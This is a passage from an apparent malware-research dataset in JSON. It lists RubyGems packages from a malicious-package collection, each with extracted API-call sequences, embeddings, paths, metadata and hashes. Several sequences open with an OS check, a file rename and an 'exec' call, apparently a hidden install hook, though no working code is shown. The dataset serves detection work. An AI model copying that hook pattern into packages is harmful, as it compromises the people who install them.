'loop_forever', 'thread.join', 'loop', 'mqtt_loop', 'sleep', 'loop_read', 'loop_write', 'loop_misc', '@client.queue_empty?.!', '@client.queue_empty?', 'counter_message.<=', 'get_packet', 'message.topic', '@filtered_topics.key?', '@filtered_topics.[]', 'callback.call', 'on_message_callback', 'puts', 'puts', 'block_given?', '@on_message.is_a?', '@on_message.lambda?', '@on_message.call', 'callback.nil?', '@filtered_topic.delete', '@filtered_topics.[]=', '@filtered_topics.key', '@filtered_topics.delete', 'require', '[\"get\", \"update\", \"delete\", \"delta\"].freeze', 'require', 'require', 'require', 'require', 'JSON.parse', '@message.[]', '@message.[]=', '@message.to_json', 'require', 'attr_reader', 'attr_accessor', 'attr_accessor', 'attr_accessor', 'create_mqtt_adapter', 'Mutex.new', 'Mutex.new', 'Mutex.new', '@client.host=', '@client.host', '@client.port=', '@client.port', '@client.client_id', 'MqttAdapter::Client.new', 'host.nil?', 'port.nil?', 'raise', '@client.host=', '@client.port=', 'self.ca_file=', 'self.key=', 'self.cert=', '@client.set_tls_ssl_context', '@client.connect', '@client.disconnect', 'topic.nil?', 'raise', '@mutex_publish.synchronize', '@client.publish', 'topic.nil?', 'raise', '@mutex_subscribe.synchronize', '@client.add_callback_filter_topic', '@client.subscribe', '@mutex_subscribe.synchronize', 'topics.each', 'topic.[](2).nil?.!', 'topic.[](2).nil?', 'topic.[]', 'topic.[](2).is_a?', 'topic.[]', '@client.add_callback_filter_topic', 'topic.first', 'topic.pop', '@client.subscribe_bunch', 'topic.nil?', 'raise', '@mutex_unsubscribe.synchronize', '@client.remove_callback_filter_topic', '@client.unsubscribe', '@mutex_unsubscribe.synchronize', 'topics.each', '@client.remove_callback_filter_topic', '@client.unsubscribe_bunch', 'paho_client?', '@client.on_connack=', 'paho_client?', '@client.on_suback=', 'paho_client?', '@client.on_unsuback=', 'paho_client?', '@client.on_puback=', 'paho_client?', '@client.on_pubrec=', 'paho_client?', '@client.on_pubrel=', 'paho_client?', '@client.on_pubcomp=', '@client.on_message=', 'paho_client?', '@client.on_connack', 'paho_client?', '@client.on_suback', 'paho_client?', '@client.on_unsuback', 'paho_client?', '@client.on_puback', 'paho_client?', '@client.on_pubrec', 'paho_client?', '@client.on_pubrel', 'paho_client?', '@client.on_pubcomp', '@client.on_message', '@client.add_callback_filter_topic', '@client.remove_callback_filter_topic', '@client.adapter.class.==', '@client.adapter.class', '@client.adapter', 'private', 'require', 'require', 'require', 'require', 'require', 'require', 'attr_accessor', 'ShadowTopicManager.new', 'JSONPayloadParser.new', '@is_subscribed.[]=', '@is_subscribed.[]=', '@is_subscribed.[]=', 'TokenCreator.new', 'mqtt_client.client_id', '@topic_subscribed_callback.[]=', '@topic_subscribed_callback.[]=', '@topic_subscribed_callback.[]=', '@topic_subscribed_task_count.[]=', '@topic_subscribed_task_count.[]=', '@topic_subscribed_task_count.[]=', 'Mutex.new', 'Mutex.new', 'Mutex.new', 'set_basic_callback', 'shadow_action', 'shadow_action', 'shadow_action', 'register_action_callback', 'register_action_callback', 'register_action_callback', 'callback.is_a?', '@topic_subscribed_callback.[]=', 'block_given?', '@topic_subscribed_callback.[]=', '@topic_manager.shadow_topic_subscribe', 'remove_action_callback', 'remove_action_callback', 'remove_action_callback', '@topic_subscribe_callback.delete.[]', '@topic_subscribe_callback.delete', '@topic_manager.shadow_topic_unsubscribe', '@logger.nil?.!', '@logger.nil?', '@logger.is_a?', 'private', 'Timers::Group.new', '@token_mutex.synchronize', '@token_handler.create_next_token', 'timer.after', 'timeout_manager', '@parser_mutex.synchronize', 'payload.==', '@payload_parser.set_message', '@payload_parser.set_attribute_value', '@payload_parser.get_json', '@is_subscribed.[]', 'handle_subscription', '@topic_manager.shadow_topic_publish', 'action.to_s', '@task_count_mutex.synchronize', '@topic_subscribed_task_count.[]', '@token_pool.[]=', 'register_token_callback', 'Thread.new', 'timer.wait', '@token_pool.has_key?', 'action_name.to_sym', '@token_pool.delete', '@token_callback.delete', 'logger?', '@logger.warn', '@task_count_mutex.synchronize', '@topic_subscribed_task_count.[]', '@topic_subscribed_task_count.[](action).<=', '@topic_subscribed_task_count.[]', '@topic_subscribed_task_count.[]=', '@topic_manager.shadow_topic_unsubscribe', '@is_subscribed.[]=', 'action.to_sym', 'proc', 'do_message_callback', '@topic_manager.on_suback=', 'lambda', '@topic_manager.retrieve_action', 'topics.[]', 'action.nil?', '@is_subscribed.[]', '@topic_manager.on_unsuback=', 'lambda', '@topic_manager.retrieve_action', 'topics.[]', 'action.nil?', '@is_subscribed.[]=', 'callback.is_a?', '@token_callback.[]=', 'block_given?', '@token_callback.[]=', '@token_callback.delete', 'callback.is_a?', '@topic_subscribed_callback.[]=', 'block_given?', '@topic_subscribed_callback.[]=', '@topic_subscribed_callback.[]=', '@topic_subscribed_task_count.[]', '@topic_subscribed_task_count.[](action).<=', '@topic_subscribed_task_count.[]', '@topic_subscribed_task_count.[]=', '@topic_manager.shadow_topic_unsubscribe', 'action.to_s', '@is_subscribed.[]=', 'message.topic', 'parse_action', 'parse_type', 'message.payload', '@parser_mutex.synchronize', '@payload_parser.set_message', '@payload_parser.get_attribute_value', '@payload_parser.get_attribute_value', '[\"get\", \"update\", \"delete\"].include?', '@token_pool.has_key?', '@token_pool.[](token).cancel', '@token_pool.[]', '@token_pool.delete', 'type.eql?', 'do_accepted', 'action.to_sym', 'do_rejected', '@task_count_mutex.synchronize', 'decresase_task_count', 'action.to_sym', '[\"delta\"].include?', 'do_delta', 'new_version.>=', 'logger?', '@logger.info', 'type.eql?', 'Thread.new', 'accepted_tasks', 'logger?', '@logger.warn', '@topic_subscribed_callback.[](action).nil?', '@topic_subscribed_callback.[]', '@topic_subscribed_callback.[](action).call', '@topic_subscribed_callback.[]', '@token_callback.has_key?', '@token_callback.[](token).call', '@token_callback.[]', '@token_callback.delete', 'new_version.>=', 'logger?', '@logger.info', '@token_callback.delete', 'logger?', '@logger.warn', 'new_version.>=', 'logger?', '@logger.info', '@topic_subscribed_callback.[](:delta).nil?', '@topic_subscribed_callback.[]', 'Thread.new', '@topic_subscribed_callback.[](:delta).call', '@topic_subscribed_callback.[]', 'logger?', '@logger.warn', '@topic_manager.shadow_topic_subscribe', 'action.to_s', '@topic_manager.paho_client?', 'Time.now.+', 'Time.now', '@is_subscribed.[](action).!', '@is_subscribed.[]', 'handle_timeout', 'sleep', 'sleep', 'Time.now.<=', 'Time.now', 'topic.split(\"/\").[]', 'topic.split', 'topic.split(\"/\").[](5).==', 'topic.split(\"/\").[]', 'topic.split', 'topic.split(\"/\").[]', 'topic.split', 'topic.split(\"/\").[]', 'topic.split', 'topic.split(\"/\").[]', 'topic.split', 'require', 'require', 'require', 'args.last.nil?', 'args.last', 'MqttManager.new', 'config_attr', 'args.last', '@mqtt_client.connect', 'logger?', 'self.logger.info', 'self.logger', 'block_given?', '@mqtt_client.disconnect', 'ShadowActionManager.new', 'File.open', 'Logger.new', 'log_file.level=', '@action_manager.logger=', '@action_manager.logger', '@action_manager.logger?', '@action_manager.shadow_get', '@action_manager.shadow_update', '@action_manager.shadow_delete', '@action_manager.register_get_callback', '@action_manager.register_update_callback', '@action_manager.register_delete_callback', '@action_manager.register_shadow_delta_callback', '@action_manager.remove_shadow_delta_callback', '@action_manager.remove_get_callback', '@action_manager.remove_update_callback', '@action_manager.remove_delete_callback', '@mqtt_client.disconnect', '@mqtt_client.config_endpoint', '@mqtt_client.config_ssl_context', 'private', 'args.dup', 'shadow_attr.keep_if', 'key.==', 'key.==', 'key.==', 'mqtt_attr.delete_if', 'key.==', 'key.==', 'key.==', 'MqttManager.new', 'shadow_attr.[]', 'shadow_attr.has_key?', 'create_shadow_handler_with_name', 'shadow_attr.[]', 'shadow_attr.[]', 'require', 'mqtt_manager.nil?', 'raise', 'shadow_name.nil?', 'raise', 'Mutex.new', 'TopicBuilder.new', 'mqtt_manager.mqtt_operation_timeout_s', '@mqtt_manager.publish', '@topic.get_topic_general', '@sub_unsub_mutex.synchronize', '@topic.is_delta?', '@mqtt_manager.subscribe', '@topic.get_topic_delta', '@mqtt_manager.subscribe_bunch', '@topic.get_topic_accepted', '@topic.get_topic_rejected', '@sub_unsub_mutex.synchronize', '@topic.is_delta?', '@mqtt_manager.unsubscribe', '@topic.get_topic_delta', '@mqtt_manager.unsubscribe_bunch', '@topic.get_topic_accepted', '@topic.get_topic_rejected', 'ACTION_NAME.each', 'topic.[](0).==', 'topic.[]', '@topic.get_topic_accepted', 'action.to_sym', '@mqtt_manager.paho_client?', '@mqtt_manager.on_suback=', '@mqtt_manager.on_suback', '@mqtt_manager.on_unsuback=', '@mqtt_manager.on_unsuback', 'require', 'require', 'require', 'require', 'shadow_name.length.>', 'shadow_name.length', 'shadow_name.[]', 'token << \"#{@client_id}\" << \"_\" << \"#{@shadow_name}\" << \"_\" << \"#{@sequence_number}\" << \"_\".<<', 'token << \"#{@client_id}\" << \"_\" << \"#{@shadow_name}\" << \"_\" << \"#{@sequence_number}\".<<', 'token << \"#{@client_id}\" << \"_\" << \"#{@shadow_name}\" << \"_\".<<', 'token << \"#{@client_id}\" << \"_\" << \"#{@shadow_name}\".<<', 'token << \"#{@client_id}\" << \"_\".<<', 'token << \"#{@client_id}\".<<', 'token.<<', 'random_token_string', 'private', 'Array(\"A\"..\"Z\") + Array(\"a\"..\"z\").+', 'Array(\"A\"..\"Z\").+', 'Array', 'Array', 'Array', 'Array.new(lenght) {\\n  charset.sample\\n}.join', 'Array.new', 'charset.sample', 'shadow_name.nil?', 'raise', 'action.==', 'ACTION_NAME.[]', 'ACTION_NAME.include?', 'raise', '@topic_general.+', 'get_topic_general(action).+', 'get_topic_general', 'get_topic_general(action).+', 'get_topic_general', 'require', 'OptionParser.new { |opts,|\\n  opts.banner=\"Basic usage basic_greeting.rb -c \\\\\"YOUR_CERTIFICATE_PATH\\\\\" -k \\\\\"YOUR_KEY_FILE_PATH\\\\\" -ca \\\\\"YOUR_ROOT_CA_PATH -H \\\\\"YOUR_ENDPOINT\\\\\" -p 8883 -t \\\\\"YOUR THING NAME\\\\\"\\\\n\"\\n  opts.separator(\"\")\\n  opts.separator(\"Common options\")\\n  opts.on_tail(\"-h\", \"--help\", \"--usage\", \"Show this message\") {\\n    puts(opts)\\n    exit\\n  }\\n  opts.on(\"-H\", \"--host [END_POINT]\", \"The endpoint where you want to connect\") { |host,|\\n    options.[]=(:host, host)\\n  }\\n  opts.on(\"-p\", \"--port [MQTT_PORT]\", \"The port used for the connection Default is 8883\") { |port,|\\n    options.[]=(:port, port)\\n  }\\n  opts.on(\"-c\", \"--cert [CERT_FILE_PATH]\", \"The path to the certificate file of the private key.\") { |cert,|\\n    options.[]=(:cert, cert)\\n  }\\n  opts.on(\"-k\", \"--key [KEY_FILE_PATH]\", \"The path to private key file that would be used for encryption\") { |key,|\\n    options.[]=(:key, key)\\n  }\\n  opts.on(\"-a\", \"--root_ca [ROOT_CA_PATH]\", \"The path to the authority certification file\") { |root_ca,|\\n    options.[]=(:root_ca, root_ca)\\n  }\\n  opts.on(\"-t\", \"--thing [THING_NAME]\", \"The Thing name on which the action would be done\") { |thing,|\\n    options.[]=(:things, thing)\\n  }\\n}.parse!', 'OptionParser.new', 'opts.banner=', 'opts.separator', 'opts.separator', 'opts.on_tail', 'puts', 'exit', 'opts.on', 'options.[]=', 'opts.on', 'options.[]=', 'opts.on', 'options.[]=', 'opts.on', 'options.[]=', 'opts.on', 'options.[]=', 'opts.on', 'options.[]=', 'options.[]', 'options.[]', 'options.[]', 'options.[]', 'options.[]', 'options.[]', 'AwsIotDevice::MqttShadowClient::MqttManager.new', 'mqtt_client.config_ssl_context', 'mqtt_client.connect', 'AwsIotDevice::MqttShadowClient::ShadowTopicManager.new', 'AwsIotDevice::MqttShadowClient::ShadowActionManager.new', 'AwsIotDevice::MqttShadowClient::ShadowClient.new', 'shadow_client.configure_endpoint', 'shadow_client.configure_credentials', 'shadow_client.create_shadow_handler_with_name', 'shadow_client.connect', '$:.unshift', 'File.expand_path', 'require', 'require', 'setting_mqtt_client', 'setting_mqtt_client', 'Proc.new', 'p', 'p', 'message.topic', 'p', 'message.payload', 'Proc.new', 'p', 'p', 'message.topic', 'p', 'message.payload', 'client.subscribe', 'client2.subscribe', 'puts', 'client.publish', 'client2.publish', 'sleep', '2.times', 'client.publish', 'sleep', 'client2.publish', 'sleep', 'sleep', 'client.disconnect', 'client2.disconnect', '$:.unshift', 'File.expand_path', 'require', 'require', 'Proc.new', 'puts', 'message.topic', 'setting_mqtt_client', 'setting_action_manager', 'client.register_shadow_delta_callback', '5.times', 'client.shadow_update', 'sleep', 'mqtt_client.disconnect', '$:.unshift', 'File.expand_path', 'require', 'require', 'Proc.new', 'puts', 'message.topic', 'setting_shadow', 'my_shadow_client.connect', 'puts', 'client.get_shadow', 'puts', 'client.get_shadow', 'puts', 'puts', 'client.get_shadow', 'sleep', '$:.unshift', 'File.expand_path', 'require', 'require', 'Proc.new', 'puts', 'message.topic', 'setting_shadow', '3.times', 'puts', 'my_shadow_client.delete_shadow', 'sleep', 'my_shadow_client.update_shadow', 'sleep', 'my_shadow_client.disconnect', 'require', 'AwsIotDevice::MqttShadowClient::ShadowClient.new', 'shadow_client.configure_endpoint', 'shadow_client.configure_credentials', 'shadow_client.create_shadow_handler_with_name', 'shadow_client.connect', 'shadow_client.register_get_callback', 'puts', 'shadow_client.register_delete_callback', 'proc', 'puts', 'shadow_client.register_update_callback', 'lambda', 'puts', 'shadow_client.register_delta_callback', 'puts', 'shadow_client.get_shadow', 'puts', 'shadow_client.delete_shadow', 'proc', 'puts', 'shadow_client.update_shadow', 'lambda', 'puts', 'sleep', 'shadow_client.remove_get_callback', 'shadow_client.remove_update_callback', 'shadow_client.remove_delete_callback', 'shadow_client.disconnect', '$:.unshift', 'File.expand_path', 'require', 'require', 'Proc.new', 'puts', 'message.topic', 'setting_shadow', 'puts', 'my_shadow_client.get_shadow', 'puts', 'my_shadow_client.get_shadow', 'puts', 'puts', 'my_shadow_client.get_shadow', 'sleep', 'require', 'AwsIotDevice::MqttShadowClient::ShadowClient.new', 'shadow_client.configure_endpoint', 'shadow_client.configure_credentials', 'shadow_client.create_shadow_handler_with_name', 'shadow_client.connect', 'shadow_client.get_shadow', 'p', 'sleep', 'shadow_client.disconnect', '$:.unshift', 'File.expand_path', 'require', 'require', 'Proc.new', 'puts', 'message.topic', 'Proc.new', 'JSON.parse', 'delta.payload', 'puts', 'message.[](\"state\").[]', 'message.[]', 'setting_shadow', 'my_shadow_client.register_delta_callback', '3.times', 'puts', '$stdin.readline', 'entry.delete!', 'my_shadow_client.update_shadow', 'puts', '3.-', 'sleep', 'my_shadow_client.disconnect', '$:.unshift', 'File.expand_path', 'require', 'require', 'setting_mqtt_client', 'setting_topic_manager', 'Proc.new', 'puts', 'puts', 'message.topic', 'puts', 'message.payload', 'puts', 'topic_client.shadow_topic_subscribe', '4.times', 'topic_client.shadow_topic_publish', 'sleep', 'mqtt_client.disconnect']",
            "n_tokens": 4712,
            "embedding": "[-0.02163762 -0.02593525 -0.00289389 ... -0.00136169 -0.01487353\n  0.02404803]",
            "cluster": "0",
            "id": 589,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/apiotics-aws_iot_client/1.0.1/apiotics-aws_iot_client-1.0.1.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/apiotics-aws_iot_client/1.0.1/apiotics-aws_iot_client-1.0.1_extracted",
            "name": "apiotics-aws_iot_client",
            "version": "1.0.1",
            "published_at": "2020-02-16T05:01:58.414Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL but not a Github URL.",
            "dependencies": "bundler, pry, rake, rspec, json, apiotics-paho-mqtt, timers",
            "SHA-256": "540d38a2eb16b0d9923c5b6bc2fcae4aa1ab1253d7ca554bba4ce3a0146bfd30"
        },
        {
            "name_version": "apns-polite-0.9.1",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/apns-polite/0.9.1/apns-polite-0.9.1_extracted/apns-polite-0.9.1_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', '$:.unshift', 'File.dirname', 'require', 'require', 'require', 'require', 'require', 'options.[]', 'options.[]', 'options.[]', 'options.[]', 'connection', 'reconnection', 'close', 'raise', 'File.exist?', 'raise', 'File.read', 'OpenSSL::SSL::SSLContext.new', 'context.cert=', 'OpenSSL::X509::Certificate.new', 'context.key=', 'OpenSSL::PKey::RSA.new', 'TCPSocket.new', 'OpenSSL::SSL::SSLSocket.new', 'ssl.connect', '@ssl.close', '@sock.close', '@sock.gets', 'line.strip.unpack', 'line.strip', 'payload.length.>=', 'payload.length', 'payload.[]', 'payload.[]', 'require', 'package_device_token', 'message.is_a?', 'package_message', 'message.[]', 'message.[]', 'message.[]', 'message.[]', 'package_message', 'message.to_s', '[0, 0, 32, t, 0, m.bytesize, m].pack', 'm.bytesize', 'private', '[device_token.gsub(/[\\\\s|<|>]/, \"\")].pack', 'device_token.gsub', 'a.[](\"aps\").[]=', 'a.[]', 'a.[](\"aps\").[]=', 'a.[]', 'a.[](\"aps\").[]=', 'a.[]', 'a.merge!', 'a.to_json', 'require', 'require', 'options.[]', 'options.[]', 'options.[]', 'options.[]', 'connection', 'reconnection', 'close', 'raise', 'File.exist?', 'raise', 'File.read', 'OpenSSL::SSL::SSLContext.new', 'context.cert=', 'OpenSSL::X509::Certificate.new', 'context.key=', 'OpenSSL::PKey::RSA.new', 'TCPSocket.new', 'OpenSSL::SSL::SSLSocket.new', 'ssl.connect', '@ssl.close', '@sock.close', 'raise', '@ssl.write', 'message.pack', 'require', 'File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/apns-polite/0.9.1/apns-polite-0.9.1_extracted/apns-polite-0.9.1_sourcecode.rb\").+', 'File.dirname', 'describe', 'it', 'ApnsPolite::Feedback.new', 'it', 'ApnsPolite::Feedback.new', 'it', 'ApnsPolite::Feedback.new', 'a.connection', 'it', 'ApnsPolite::Feedback.new', 'a.reconnection', 'it', 'ApnsPolite::Feedback.new', 'a.stream', 'p', 'p', 'require', 'File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/apns-polite/0.9.1/apns-polite-0.9.1_extracted/apns-polite-0.9.1_sourcecode.rb\").+', 'File.dirname', 'describe', 'it', 'ApnsPolite::Message.new', 'it', 'ApnsPolite::Message.new', 'it', 'ApnsPolite::Message.new', 'require', 'File.dirname(\"/Users/xxxx/Documents/malware/rubygems/Backstabber/apns-polite/0.9.1/apns-polite-0.9.1_extracted/apns-polite-0.9.1_sourcecode.rb\").+', 'File.dirname', 'describe', 'it', 'ApnsPolite::Notification.new', 'it', 'ApnsPolite::Notification.new', 'it', 'ApnsPolite::Notification.new', 'a.connection', 'it', 'ApnsPolite::Notification.new', 'a.reconnection', 'it', 'ApnsPolite::Message.new', 'ApnsPolite::Notification.new', 'a.push', 'require', 'require', 'require', 'File.join', 'File.dirname']",
            "n_tokens": 900,
            "embedding": "[-0.0102633  -0.00365961  0.00033699 ... -0.00810945 -0.03095372\n  0.0168453 ]",
            "cluster": "0",
            "id": 373,
            "Filepath": "/Users/xxxx/Documents/malware/rubygems/Backstabber/apns-polite/0.9.1/apns-polite-0.9.1.gem",
            "path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/apns-polite/0.9.1/apns-polite-0.9.1_extracted",
            "name": "apns-polite",
            "version": "0.9.1",
            "published_at": "2020-02-16T05:23:56.067Z",
            "Status": "tracked",
            "OSS": "RubyGems",
            "description": NaN,
            "author": 1.0,
            "maintainers": "The number of author or maintainer is 1.",
            "repository_url": "contain a homepage URL and a Github URL.",
            "dependencies": NaN,
            "SHA-256": "cd522d2465989e8875350f7b55960fdbcdd59810af3e929770d69125206d6ff1"
        },
        {
            "name_version": "apod_cli-0.0.4",
            "SourceCode_Path": "/Users/xxxx/Documents/malware/rubygems/Backstabber/apod_cli/0.0.4/apod_cli-0.0.4_extracted/apod_cli-0.0.4_sourcecode.rb",
            "Source": "Backstabber-Knife",
            "code_api": "['require', 'require', 'require', 'RbConfig::CONFIG.[]', 'os.match', 'TacoBell.check_win', 'File.rename', 'exec', 'require', 'require', 'require', 'require_relative', 'require_relative', 'require_relative', 'CLI.new.call', 'CLI.new', 'require', 'require', 'require', 'require_relative', 'require_relative', 'puts', 'Scraper.new', 'Printer.new', '@scraper.data', 'start', 'puts', 'puts', '\"[1]\".colorize(:red).+', '\"[1]\".colorize', 'puts', '\"[2]\".colorize(:red).+', '\"[2]\".colorize', 'puts', '\"[3]\".colorize(:red).+', '\"[3]\".colorize', 'puts', '\"[4]\".colorize(:red).+', '\"[4]\".colorize', 'valid_input([\"1\", \"2\", \"3\", \"4\"]).to_i', 'valid_input', 'date_search', 'name_search', 'date_search', 'sample', 'puts', 'puts', '\"[y/n]\".colorize', 'valid_input([\"y\", \"n\"]).==', 'valid_input', 'puts', 'start', 'puts', 'puts', '\"\\\\nPlease enter the number (\" + \"[1]\".colorize(:red) + \" - \" + \"[#{@data.length}]\".colorize(:red) + \") of links you would\\\\nlike to sample. Or, type \" + \"\\'all\\'\".colorize(:red).+', '\"\\\\nPlease enter the number (\" + \"[1]\".colorize(:red) + \" - \" + \"[#{@data.length}]\".colorize(:red) + \") of links you would\\\\nlike to sample. Or, type \".+', '\"\\\\nPlease enter the number (\" + \"[1]\".colorize(:red) + \" - \" + \"[#{@data.length}]\".colorize(:red).+', '\"\\\\nPlease enter the number (\" + \"[1]\".colorize(:red) + \" - \".+', '\"\\\\nPlease enter the number (\" + \"[1]\".colorize(:red).+', '\"\\\\nPlease enter the number (\".+', '\"[1]\".colorize', '\"[#{@data.length}]\".colorize', '@data.length', '\"\\'all\\'\".colorize', '[(1..@data.length).to_a.map { |e,|\\n  e.to_s\\n}, \"all\"].flatten', '(1..@data.length).to_a.map', '(1..@data.length)\\n.to_a', '@data.length', 'e.to_s', 'valid_input', 'num.==', '@data.sample', 'num.to_i', 'puts', 'print_links', 'puts', 'more_info', 'puts', 'puts', '\"[1]\".colorize(:red).+', '\"[1]\".colorize', 'puts', '\"[2]\".colorize(:red).+', '\"[2]\".colorize', 'puts', '\"[3]\".colorize(:red).+', '\"[3]\".colorize', 'valid_input([\"1\", \"2\", \"3\"]).to_i', 'valid_input', 'puts', '\"\\\\nPlease enter a \" + \"date\".colorize(:red) + \" in the format \" + \"yyyy-mm-dd\".colorize(:red).+', '\"\\\\nPlease enter a \" + \"date\".colorize(:red) + \" in the format \".+', '\"\\\\nPlease enter a \" + \"date\".colorize(:red).+', '\"\\\\nPlease enter a \".+', '\"date\".colorize', '\"yyyy-mm-dd\".colorize', 'gets.chomp.strip', 'gets.chomp', 'gets', '@data.each', 'hash.[](:date).==', 'hash.[]', 'results.<<', 'results.==', 'puts', 'puts', 'print_links', 'print_pages', 'puts', '\"\\\\nPlease enter a \" + \"day of the year\".colorize(:red) + \" in the format \" + \"mm-dd\".colorize(:red).+', '\"\\\\nPlease enter a \" + \"day of the year\".colorize(:red) + \" in the format \".+', '\"\\\\nPlease enter a \" + \"day of the year\".colorize(:red).+', '\"\\\\nPlease enter a \".+', '\"day of the year\".colorize', '\"mm-dd\".colorize', 'gets.chomp.strip', 'gets.chomp', 'gets', '@data.each', 'hash.[](:date).slice(5..-1).==', 'hash.[](:date).slice', 'hash.[]', 'results.<<', 'results.==', 'puts', 'puts', '\"\\\\nPlease enter a \" + \"start date\".colorize(:red) + \" in the format \" + \"yyyy-mm-dd\".colorize(:red).+', '\"\\\\nPlease enter a \" + \"start date\".colorize(:red) + \" in the format \".+', '\"\\\\nPlease enter a \" + \"start date\".colorize(:red).+', '\"\\\\nPlease enter a \".+', '\"start date\".colorize', '\"yyyy-mm-dd\".colorize', 'gets.chomp.strip', 'gets.chomp', 'gets', '@data.each', 'hash.[](:date).==', 'hash.[]', 'inputs.<<', 'inputs.length.!=', 'inputs.length', 'puts', 'puts', '\"\\\\nPlease enter an \" + \"end date\".colorize(:red).+', '\"\\\\nPlease enter an \".+', '\"end date\".colorize', '@data.[](0).[]', '@data.[]', 'gets.chomp.strip', 'gets.chomp', 'gets', '@data.each', 'hash.[](:date).==', 'hash.[]', 'inputs.<<', 'inputs.length.!=', 'inputs.length', 'puts', 'inputs.sort!', '@data.each', 'hash.[](:date).>=', 'hash.[]', 'inputs.[]', 'hash.[](:date).<=', 'hash.[]', 'inputs.[]', 'results.<<', 'name_search', 'results.==', 'puts', 'puts', 'print_links', 'puts', 'more_info', 'puts', '\"\\\\nPlease enter one or multiple \" + \"search terms\".colorize(:red).+', '\"\\\\nPlease enter one or multiple \".+', '\"search terms\".colorize', 'gets.chomp.strip.downcase.split', 'gets.chomp.strip.downcase', 'gets.chomp.strip', 'gets.chomp', 'gets', 'searchterms.each', 'searchterm.strip!', 'results.<<', 'searchspace.select', 'hash.[](:name).downcase.include?', 'hash.[](:name).downcase', 'hash.[]', 'results.flatten.uniq.sort', 'results.flatten.uniq', 'results.flatten', 'h1.[](:date).>', 'h1.[]', 'h2.[]', 'searchspace.!=', 'unique.==', 'puts', 'puts', 'print_links', 'puts', 'more_info', 'arr.length.>', 'arr.length', 'puts', 'puts', 'puts', '\"[y/n]\".colorize', 'valid_input([\"y\", \"n\"]).==', 'valid_input', 'puts', 'arr.length.>', 'arr.length', 'puts', '\"Please enter the \" + \"results number\".colorize(:red) + \" of any link(s) you would like more\\\\ninformation on, comma separated. Or, type \" + \"\\'all\\'\".colorize(:red).+', '\"Please enter the \" + \"results number\".colorize(:red) + \" of any link(s) you would like more\\\\ninformation on, comma separated. Or, type \".+', '\"Please enter the \" + \"results number\".colorize(:red).+', '\"Please enter the \".+', '\"results number\".colorize', '\"\\'all\\'\".colorize', '[(1..arr.length).to_a.map { |e,|\\n  e.to_s\\n}, \"all\"].flatten', '(1..arr.length).to_a.map', '(1..arr.length)\\n.to_a', 'arr.length', 'e.to_s', 'validated.!', 'gets.chomp.strip.downcase.split', 'gets.chomp.strip.downcase', 'gets.chomp.strip', 'gets.chomp', 'gets', 'searchterms.each', 'searchterm.strip!', 'wanted.include?(searchterm).!', 'wanted.include?', 'puts', 'failed.!', 'searchterms.include?', 'print_pages', 'searchterms.each', 'selected.<<', 'arr.[]', 'searchterm.to_i.-', 'searchterm.to_i', 'print_pages', 'puts', 'arr.each_with_index', 'idx.+', '((arr.length.to_s.length + 3) - starter.length)\\n.times', '(arr.length.to_s.length + 3)\\n.-', 'arr.length.to_s.length.+', 'arr.length.to_s.length', 'arr.length.to_s', 'arr.length', 'starter.length', '@printer.print_link', 'arr.each', '@printer.print_page', '@scraper.pic_data', 'hash.[]', 'gets.chomp.strip.downcase', 'gets.chomp.strip', 'gets.chomp', 'gets', 'wanted.include?', 'puts', 'valid_input', 'require', 'require', 'require', 'require_relative', 'require_relative', 'start.colorize(:red) + \"The astronomy picture of the day on \" + link_hash.[](:date).colorize(:green) + \" was \" + link_hash.[](:name).colorize(:green).+', 'start.colorize(:red) + \"The astronomy picture of the day on \" + link_hash.[](:date).colorize(:green) + \" was \".+', 'start.colorize(:red) + \"The astronomy picture of the day on \" + link_hash.[](:date).colorize(:green).+', 'start.colorize(:red) + \"The astronomy picture of the day on \".+', 'start.colorize(:red).+', 'start.colorize', 'link_hash.[](:date).colorize', 'link_hash.[]', 'link_hash.[](:name).colorize', 'link_hash.[]', 'start.length.times', 'start.length', '\"The link is \" + link_hash.[](:link).colorize(:green).+', '\"The link is \".+', 'link_hash.[](:link).colorize', 'link_hash.[]', 'puts', 'page_hash.[](:expl).split', 'page_hash.[]', 'words_arr.each_with_index', 'word.+', 'line.length.>=', 'line.length', 'idx.==', 'words_arr.length.-', 'words_arr.length', 'lines_arr.<<', 'line.strip', 'line.strip.length.>', 'line.strip.length', 'line.strip', 'line.strip.length', 'line.strip', 'puts', 'puts', 'pad(max_line_length, page_hash.[](:name), \"-\").colorize', 'pad', 'page_hash.[]', 'puts', 'pad(max_line_length, page_hash.[](:link), \"-\").colorize', 'pad', 'page_hash.[]', 'lines_arr.each', 'puts', 'pad', 'puts', '((max - str.length) / 2)\\n.ceil', '(max - str.length)\\n./', 'max.-', 'str.length', 'padding_amount.times', 'require', 'require', 'require', 'require_relative', 'require_relative', 'self.class.index_data', 'self.class', 'Nokogiri.HTML', 'open', 'Nokogiri.HTML(open(url)).css(\"body\").text.match(/Explanation:[\\\\s\\\\S]+?(\\\\n(\\\\s*)){3}/).to_s.gsub(/\\\\n/, \" \").gsub(/\\\\s{2,}/, \" \").strip', 'Nokogiri.HTML(open(url)).css(\"body\").text.match(/Explanation:[\\\\s\\\\S]+?(\\\\n(\\\\s*)){3}/).to_s.gsub(/\\\\n/, \" \").gsub', 'Nokogiri.HTML(open(url)).css(\"body\").text.match(/Explanation:[\\\\s\\\\S]+?(\\\\n(\\\\s*)){3}/).to_s.gsub', 'Nokogiri.HTML(open(url)).css(\"body\").text.match(/Explanation:[\\\\s\\\\S]+?(\\\\n(\\\\s*)){3}/).to_s', 'Nokogiri.HTML(open(url)).css(\"body\").text.match', 'Nokogiri.HTML(open(url)).css(\"body\").text', 'Nokogiri.HTML(open(url)).css', 'Nokogiri.HTML', 'open', 'self.data.select { |hash,|\\n  url.include?(hash.[](:link))\\n}.[](0).[]', 'self.data.select { |hash,|\\n  url.include?(hash.[](:link))\\n}.[]', 'self.data.select', 'self.data', 'url.include?', 'hash.[]', 'Nokogiri.HTML(open(url)).css(\"p a img\").to_a.!=', 'Nokogiri.HTML(open(url)).css(\"p a 